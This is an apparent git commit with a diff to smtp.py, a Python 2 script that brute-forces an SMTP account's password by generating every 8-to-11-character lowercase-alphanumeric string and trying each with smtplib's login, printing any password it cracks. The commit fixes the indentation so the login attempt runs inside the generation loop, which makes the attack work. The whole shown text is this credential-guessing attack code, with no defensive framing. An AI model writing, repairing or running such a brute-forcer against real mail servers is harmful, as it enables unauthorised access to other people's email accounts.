7e5191eaef1e5a36ca5454f0bb98a5ae31962090
x0rLS <42499784+x0rLS@users.noreply.github.com>
2018-12-28 19:02:42 +0100

    Update smtp.py

--- smtp.py
+++ smtp.py
@@ -12,9 +12,9 @@ for n in range(8,12):
    for perm in itertools.product('abcdefghijklmnopqrstuvwxyz1234567890', repeat=n):
       password = ''.join(perm)
          
-try: 
-    smtpserver.login(user, password) 
-    print "[+] Password Cracked: %s" % password
-    time.sleep(10)
-except smtplib.SMTPAuthenticationError:
-    print "[!] Password Inccorect: %s" % password
+      try: 
+          smtpserver.login(user, password) 
+          print "[+] Password Cracked: %s" % password
+          time.sleep(10)
+      except smtplib.SMTPAuthenticationError:
+          print "[!] Password Inccorect: %s" % password
